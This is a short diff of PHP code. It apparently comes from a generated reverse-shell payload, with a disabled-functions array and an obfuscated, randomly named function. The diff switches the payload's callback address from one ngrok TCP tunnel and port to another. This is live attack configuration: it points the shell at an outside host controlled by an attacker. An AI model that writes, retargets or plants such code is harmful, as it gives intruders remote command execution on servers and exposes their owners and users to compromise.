@@ -10,8 +10,8 @@
         $dis=array();
       }
       
-    $ipaddr='8.tcp.ngrok.io';
-    $port=19666;
+    $ipaddr='6.tcp.ngrok.io';
+    $port=12243;
 
     if(!function_exists('AOSYkYOdX')){
       function AOSYkYOdX($c){
